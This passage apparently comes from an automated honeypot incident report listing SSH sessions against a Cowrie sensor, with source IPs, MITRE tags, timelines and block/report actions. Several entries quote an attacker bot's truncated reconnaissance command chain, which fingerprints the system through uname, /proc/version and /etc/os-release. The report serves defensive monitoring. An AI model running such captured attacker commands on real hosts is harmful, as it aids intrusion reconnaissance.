| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:16:10` | `cowrie.session.connect` |
| `2026-07-24 16:16:10` | `cowrie.client.version` |
| `2026-07-24 16:16:10` | `cowrie.client.kex` |
| `2026-07-24 16:16:10` | `cowrie.login.success` |
| `2026-07-24 16:16:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a298499c2f36

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-24 16:16 |
| **Last Seen** | 2026-07-24 16:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:16:10` | `cowrie.session.connect` |
| `2026-07-24 16:16:10` | `cowrie.client.version` |
| `2026-07-24 16:16:10` | `cowrie.client.kex` |
| `2026-07-24 16:16:10` | `cowrie.login.success` |
| `2026-07-24 16:16:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4468854c2b5

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-24 16:16 |
| **Last Seen** | 2026-07-24 16:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:16:10` | `cowrie.session.connect` |
| `2026-07-24 16:16:10` | `cowrie.client.version` |
| `2026-07-24 16:16:10` | `cowrie.client.kex` |
| `2026-07-24 16:16:10` | `cowrie.login.success` |
| `2026-07-24 16:16:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-407cd265c237

| Field | Detail |
|---|---|
| **Source IP** | `115.190.225[.]133` |
| **First Seen** | 2026-07-24 16:16 |
| **Last Seen** | 2026-07-24 16:21 |
| **Session Duration** | 300s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:16:47` | `cowrie.session.connect` |
| `2026-07-24 16:16:47` | `cowrie.client.version` |
| `2026-07-24 16:16:47` | `cowrie.client.kex` |
| `2026-07-24 16:16:48` | `cowrie.login.success` |
| `2026-07-24 16:21:48` | `cowrie.session.file_upload` |
| `2026-07-24 16:21:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.225[.]133` to AbuseIPDB if not already reported
- [ ] Block `115.190.225[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56a81bcf9de9

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:17 |
| **Last Seen** | 2026-07-24 16:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:17:17` | `cowrie.session.connect` |
| `2026-07-24 16:17:17` | `cowrie.client.version` |
| `2026-07-24 16:17:17` | `cowrie.client.kex` |
| `2026-07-24 16:17:18` | `cowrie.login.success` |
| `2026-07-24 16:17:19` | `cowrie.session.params` |
| `2026-07-24 16:17:19` | `cowrie.command.input` |
| `2026-07-24 16:17:19` | `cowrie.command.input` |
| `2026-07-24 16:17:19` | `cowrie.command.input` |
| `2026-07-24 16:17:19` | `cowrie.command.input` |
| `2026-07-24 16:17:19` | `cowrie.command.input` |
| `2026-07-24 16:17:19` | `cowrie.command.success` |
| `2026-07-24 16:17:19` | `cowrie.command.input` |
| `2026-07-24 16:17:19` | `cowrie.command.input` |
| `2026-07-24 16:17:19` | `cowrie.command.input` |
| `2026-07-24 16:17:19` | `cowrie.command.input` |
| `2026-07-24 16:17:19` | `cowrie.log.closed` |
| `2026-07-24 16:17:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af48038a1308

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:18 |
| **Last Seen** | 2026-07-24 16:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:18:45` | `cowrie.session.connect` |
| `2026-07-24 16:18:46` | `cowrie.client.version` |
| `2026-07-24 16:18:46` | `cowrie.client.kex` |
| `2026-07-24 16:18:47` | `cowrie.login.success` |
| `2026-07-24 16:18:49` | `cowrie.session.params` |
| `2026-07-24 16:18:49` | `cowrie.command.input` |
| `2026-07-24 16:18:49` | `cowrie.command.input` |
| `2026-07-24 16:18:49` | `cowrie.command.input` |
| `2026-07-24 16:18:49` | `cowrie.command.input` |
| `2026-07-24 16:18:49` | `cowrie.command.input` |
| `2026-07-24 16:18:49` | `cowrie.command.success` |
| `2026-07-24 16:18:49` | `cowrie.command.input` |
| `2026-07-24 16:18:49` | `cowrie.command.input` |
| `2026-07-24 16:18:49` | `cowrie.command.input` |
| `2026-07-24 16:18:49` | `cowrie.command.input` |
| `2026-07-24 16:18:49` | `cowrie.log.closed` |
| `2026-07-24 16:18:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d02deb7f10fe

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:20 |
| **Last Seen** | 2026-07-24 16:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:20:08` | `cowrie.session.connect` |
| `2026-07-24 16:20:08` | `cowrie.client.version` |
| `2026-07-24 16:20:08` | `cowrie.client.kex` |
| `2026-07-24 16:20:11` | `cowrie.login.success` |
| `2026-07-24 16:20:12` | `cowrie.session.params` |
| `2026-07-24 16:20:12` | `cowrie.command.input` |
| `2026-07-24 16:20:12` | `cowrie.command.input` |
| `2026-07-24 16:20:12` | `cowrie.command.input` |
| `2026-07-24 16:20:12` | `cowrie.command.input` |
| `2026-07-24 16:20:12` | `cowrie.command.input` |
| `2026-07-24 16:20:12` | `cowrie.command.success` |
| `2026-07-24 16:20:12` | `cowrie.command.input` |
| `2026-07-24 16:20:12` | `cowrie.command.input` |
| `2026-07-24 16:20:12` | `cowrie.command.input` |
| `2026-07-24 16:20:12` | `cowrie.command.input` |
| `2026-07-24 16:20:13` | `cowrie.log.closed` |
| `2026-07-24 16:20:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da204340bce0

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:21 |
| **Last Seen** | 2026-07-24 16:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:21:28` | `cowrie.session.connect` |
| `2026-07-24 16:21:29` | `cowrie.client.version` |
| `2026-07-24 16:21:29` | `cowrie.client.kex` |
| `2026-07-24 16:21:31` | `cowrie.login.success` |
| `2026-07-24 16:21:32` | `cowrie.session.params` |
| `2026-07-24 16:21:32` | `cowrie.command.input` |
| `2026-07-24 16:21:32` | `cowrie.command.input` |
| `2026-07-24 16:21:32` | `cowrie.command.input` |
| `2026-07-24 16:21:32` | `cowrie.command.input` |
| `2026-07-24 16:21:32` | `cowrie.command.input` |
| `2026-07-24 16:21:32` | `cowrie.command.success` |
| `2026-07-24 16:21:32` | `cowrie.command.input` |
| `2026-07-24 16:21:32` | `cowrie.command.input` |
| `2026-07-24 16:21:32` | `cowrie.command.input` |
| `2026-07-24 16:21:32` | `cowrie.command.input` |
| `2026-07-24 16:21:33` | `cowrie.log.closed` |
| `2026-07-24 16:21:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b195e7228fb

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:22 |
| **Last Seen** | 2026-07-24 16:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:22:50` | `cowrie.session.connect` |
| `2026-07-24 16:22:51` | `cowrie.client.version` |
| `2026-07-24 16:22:51` | `cowrie.client.kex` |
| `2026-07-24 16:22:53` | `cowrie.login.success` |
| `2026-07-24 16:22:54` | `cowrie.session.params` |
| `2026-07-24 16:22:54` | `cowrie.command.input` |
| `2026-07-24 16:22:54` | `cowrie.command.input` |
| `2026-07-24 16:22:54` | `cowrie.command.input` |
| `2026-07-24 16:22:54` | `cowrie.command.input` |
| `2026-07-24 16:22:54` | `cowrie.command.input` |
| `2026-07-24 16:22:54` | `cowrie.command.success` |
| `2026-07-24 16:22:54` | `cowrie.command.input` |
| `2026-07-24 16:22:54` | `cowrie.command.input` |
| `2026-07-24 16:22:54` | `cowrie.command.input` |
| `2026-07-24 16:22:54` | `cowrie.command.input` |
| `2026-07-24 16:22:55` | `cowrie.log.closed` |
| `2026-07-24 16:22:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42c9d40cc67b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:24 |
| **Last Seen** | 2026-07-24 16:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:24:16` | `cowrie.session.connect` |
| `2026-07-24 16:24:16` | `cowrie.client.version` |
| `2026-07-24 16:24:16` | `cowrie.client.kex` |
| `2026-07-24 16:24:18` | `cowrie.login.success` |
| `2026-07-24 16:24:19` | `cowrie.session.params` |
| `2026-07-24 16:24:19` | `cowrie.command.input` |
| `2026-07-24 16:24:19` | `cowrie.command.input` |
| `2026-07-24 16:24:19` | `cowrie.command.input` |
| `2026-07-24 16:24:19` | `cowrie.command.input` |
| `2026-07-24 16:24:19` | `cowrie.command.input` |
| `2026-07-24 16:24:19` | `cowrie.command.success` |
| `2026-07-24 16:24:19` | `cowrie.command.input` |
| `2026-07-24 16:24:19` | `cowrie.command.input` |
| `2026-07-24 16:24:19` | `cowrie.command.input` |
| `2026-07-24 16:24:19` | `cowrie.command.input` |
| `2026-07-24 16:24:20` | `cowrie.log.closed` |
| `2026-07-24 16:24:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cc7db70fe4e

| Field | Detail |
|---|---|
| **Source IP** | `117.71.53[.]210` |
| **First Seen** | 2026-07-24 16:24 |
| **Last Seen** | 2026-07-24 16:24 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:24:36` | `cowrie.session.connect` |
| `2026-07-24 16:24:37` | `cowrie.client.version` |
| `2026-07-24 16:24:37` | `cowrie.client.kex` |
| `2026-07-24 16:24:39` | `cowrie.login.success` |
| `2026-07-24 16:24:40` | `cowrie.direct-tcpip.request` |
| `2026-07-24 16:24:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.71.53[.]210` to AbuseIPDB if not already reported
- [ ] Block `117.71.53[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b2c6a45e7fd

| Field | Detail |
|---|---|
| **Source IP** | `187.126.105[.]42` |
| **First Seen** | 2026-07-24 16:24 |
| **Last Seen** | 2026-07-24 16:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:24:49` | `cowrie.session.connect` |
| `2026-07-24 16:24:50` | `cowrie.client.version` |
| `2026-07-24 16:24:50` | `cowrie.client.kex` |
| `2026-07-24 16:24:52` | `cowrie.login.success` |
| `2026-07-24 16:24:53` | `cowrie.direct-tcpip.request` |
| `2026-07-24 16:24:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.126.105[.]42` to AbuseIPDB if not already reported
- [ ] Block `187.126.105[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0646f241427

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:25 |
| **Last Seen** | 2026-07-24 16:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:25:38` | `cowrie.session.connect` |
| `2026-07-24 16:25:39` | `cowrie.client.version` |
| `2026-07-24 16:25:39` | `cowrie.client.kex` |
| `2026-07-24 16:25:40` | `cowrie.login.success` |
| `2026-07-24 16:25:42` | `cowrie.session.params` |
| `2026-07-24 16:25:42` | `cowrie.command.input` |
| `2026-07-24 16:25:42` | `cowrie.command.input` |
| `2026-07-24 16:25:42` | `cowrie.command.input` |
| `2026-07-24 16:25:42` | `cowrie.command.input` |
| `2026-07-24 16:25:42` | `cowrie.command.input` |
| `2026-07-24 16:25:42` | `cowrie.command.success` |
| `2026-07-24 16:25:42` | `cowrie.command.input` |
| `2026-07-24 16:25:42` | `cowrie.command.input` |
| `2026-07-24 16:25:42` | `cowrie.command.input` |
| `2026-07-24 16:25:42` | `cowrie.command.input` |
| `2026-07-24 16:25:42` | `cowrie.log.closed` |
| `2026-07-24 16:25:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bb229ff9b1e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:27 |
| **Last Seen** | 2026-07-24 16:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:27:03` | `cowrie.session.connect` |
| `2026-07-24 16:27:03` | `cowrie.client.version` |
| `2026-07-24 16:27:03` | `cowrie.client.kex` |
| `2026-07-24 16:27:04` | `cowrie.login.success` |
| `2026-07-24 16:27:06` | `cowrie.session.params` |
| `2026-07-24 16:27:06` | `cowrie.command.input` |
| `2026-07-24 16:27:06` | `cowrie.command.input` |
| `2026-07-24 16:27:06` | `cowrie.command.input` |
| `2026-07-24 16:27:06` | `cowrie.command.input` |
| `2026-07-24 16:27:06` | `cowrie.command.input` |
| `2026-07-24 16:27:06` | `cowrie.command.success` |
| `2026-07-24 16:27:06` | `cowrie.command.input` |
| `2026-07-24 16:27:06` | `cowrie.command.input` |
| `2026-07-24 16:27:06` | `cowrie.command.input` |
| `2026-07-24 16:27:06` | `cowrie.command.input` |
| `2026-07-24 16:27:06` | `cowrie.log.closed` |
| `2026-07-24 16:27:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e220677bf329

| Field | Detail |
|---|---|
| **Source IP** | `112.26.101[.]76` |
| **First Seen** | 2026-07-24 16:27 |
| **Last Seen** | 2026-07-24 16:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:27:14` | `cowrie.session.connect` |
| `2026-07-24 16:27:15` | `cowrie.client.version` |
| `2026-07-24 16:27:15` | `cowrie.client.kex` |
| `2026-07-24 16:27:17` | `cowrie.login.success` |
| `2026-07-24 16:27:17` | `cowrie.direct-tcpip.request` |
| `2026-07-24 16:27:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.26.101[.]76` to AbuseIPDB if not already reported
- [ ] Block `112.26.101[.]76` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2a01a41c6f2

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:28 |
| **Last Seen** | 2026-07-24 16:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 16:28:26` | `cowrie.session.connect` |
| `2026-07-24 16:28:26` | `cowrie.client.version` |
| `2026-07-24 16:28:26` | `cowrie.client.kex` |
| `2026-07-24 16:28:28` | `cowrie.login.success` |
| `2026-07-24 16:28:29` | `cowrie.session.params` |
| `2026-07-24 16:28:29` | `cowrie.command.input` |
| `2026-07-24 16:28:29` | `cowrie.command.input` |
| `2026-07-24 16:28:29` | `cowrie.command.input` |
| `2026-07-24 16:28:29` | `cowrie.command.input` |
| `2026-07-24 16:28:29` | `cowrie.command.input` |
| `2026-07-24 16:28:29` | `cowrie.command.success` |
| `2026-07-24 16:28:29` | `cowrie.command.input` |
| `2026-07-24 16:28:29` | `cowrie.command.input` |
| `2026-07-24 16:28:29` | `cowrie.command.input` |
| `2026-07-24 16:28:29` | `cowrie.command.input` |
| `2026-07-24 16:28:30` | `cowrie.log.closed` |
| `2026-07-24 16:28:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c55ec79134a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 16:29 |
| **Last Seen** | 2026-07-24 16:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
